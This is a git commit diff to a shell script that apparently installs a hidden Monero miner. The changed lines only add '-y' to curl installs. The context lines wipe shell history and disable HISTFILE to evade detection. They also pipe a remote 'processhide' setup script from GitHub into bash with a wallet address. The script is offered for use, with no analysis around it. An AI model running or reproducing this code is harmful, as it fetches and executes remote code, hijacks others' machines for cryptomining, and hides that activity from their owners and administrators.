6c94b8168fcd716fb23193fcf11106b261fbba3a
Acen <113854209+littlAcen@users.noreply.github.com>
2024-05-18 23:06:49 +0200

    Update setup_mo_4_r00t_and_user.sh

--- setup_mo_4_r00t_and_user.sh
+++ setup_mo_4_r00t_and_user.sh
@@ -4,8 +4,8 @@ unset HISTFILE
 unset HISTFILE ;history -d $((HISTCMD-2))
 export HISTFILE=/dev/null ;history -d $((HISTCMD-2))
 
-apt install curl
-yum install curl
+apt install curl -y
+yum install curl -y
 
 rootstuff(){
   curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru littlAcen@24-mail.com
